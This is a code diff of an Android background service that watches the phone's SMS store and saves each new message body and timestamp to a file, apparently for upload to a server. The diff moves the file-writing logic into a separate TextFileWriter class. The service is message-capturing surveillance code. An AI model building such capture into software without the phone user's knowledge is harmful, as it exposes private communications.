@@ -31,8 +31,6 @@ public class TextMessageService extends Service {
 
     private ContentResolver contentResolver;
 
-    private String textMessageDate;
-
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         contentResolver = this.getContentResolver();
@@ -46,8 +44,6 @@ public class TextMessageService extends Service {
     private class TextMessagesObserver extends ContentObserver {
 
         private String lastTextMessageId;
-
-        private File outputFile;
 
         TextMessagesObserver(Handler handler) {
             super(handler);
@@ -78,40 +74,15 @@ public class TextMessageService extends Service {
                 if (!id.equals(lastTextMessageId)) {
                     lastTextMessageId = id;
                     String textMessage = cursor.getString(cursor.getColumnIndex("body"));
-                    textMessageDate = DateUtils.convertToServerDateTimeFormat(new Date());
+                    TextFileWriter textFileWriter = new TextFileWriter(textMessage, new Date());
                     try {
-                        saveTextMessage(textMessage);
+                        textFileWriter.saveText();
                     } catch (IOException | JSONException e) {
                         e.printStackTrace();
                     }
                 }
                 cursor.close();
             }
-        }
-
-        private void saveTextMessage(String textMessage) throws IOException, JSONException {
-            File outputDir = FileUtils.getTextDirectory();
-            if (!FileUtils.createDirectory(outputDir))
-                Log.e(TAG, "Uploading text messages: cannot create a new directory.");
-
-            String fileName = FileUtils.getTextFileName() + ".txt";
-            outputFile = new File(outputDir, fileName);
-            boolean fileExists = outputFile.exists();
-
-            FileOutputStream fileOutputStream = new FileOutputStream(outputFile, true);
-            if (fileExists)
-                fileOutputStream.write(",".getBytes());
-            fileOutputStream.write(formatTextMessage(textMessage).getBytes());
-            fileOutputStream.close();
-        }
-
-
-        private String formatTextMessage(String textMessage) throws JSONException {
-            JSONObject json = new JSONObject();
-            json.put("message", textMessage);
-            json.put("datetime", textMessageDate);
-
-            return json.toString();
         }
     }
 
